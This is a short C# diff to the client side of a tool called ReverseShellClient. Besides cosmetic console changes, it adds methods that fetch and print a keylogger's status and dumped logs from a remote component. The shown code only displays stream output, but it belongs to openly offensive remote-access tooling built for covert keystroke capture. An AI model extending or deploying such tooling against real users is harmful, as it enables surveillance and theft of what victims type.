@@ -100,6 +100,8 @@ namespace ReverseShellClient
 
         public void WaitForServerToFinishFileDownload()
         {
+            ConsoleColorTools.WriteCommandMessage("Starting download of file from url");
+
             var result = sr.ReadLine();
             if (result.Contains("Success"))
             {
@@ -162,6 +164,7 @@ namespace ReverseShellClient
             Console.WriteLine("Local cwd : '{0}'", Directory.GetCurrentDirectory());
         }
 
+
         public void lls()
         {
             var cwd = Directory.GetCurrentDirectory();
@@ -178,6 +181,7 @@ namespace ReverseShellClient
                 Console.WriteLine("          {0}", formattedFile);
             }
         }
+
         
         public void lcd(string argument)
         {
@@ -190,7 +194,7 @@ namespace ReverseShellClient
             }
             else
             {
-                Console.WriteLine("No such directory");
+                ConsoleColorTools.WriteCommandError("No such directory");
             }
         }
 
@@ -201,5 +205,24 @@ namespace ReverseShellClient
             sw.WriteLine("Hello !");
             sw.Flush();
         }
+
+
+        #region Modules functions
+
+        #region Keylogger
+        public void GetKeyloggerStatus()
+        {
+            Console.WriteLine(sr.ReadLine());
+        }
+
+
+        public void DumpKeyloggerLogs()
+        {
+            // TODO : implement possibility to send the dump in a file
+            Console.WriteLine(sr.ReadLine());
+        }
+        #endregion Keylogger
+
+        #endregion Modules functions
     }
 }
